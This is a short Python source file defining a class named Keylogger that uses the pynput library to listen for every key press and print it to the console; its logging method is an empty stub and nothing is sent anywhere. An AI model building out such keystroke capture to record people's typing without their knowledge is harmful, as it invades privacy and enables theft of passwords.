from pynput import keyboard

class Keylogger:
    
    def __init__(self) -> None:
        pass

    def on_key_pressed(self, key) -> bool:
        print("Pressed: " + str(key))
        return True
   
    def write_log(self):
        pass

    def start(self):
        with keyboard.Listener(
            on_press=self.on_key_pressed) as listener:
            listener.join()
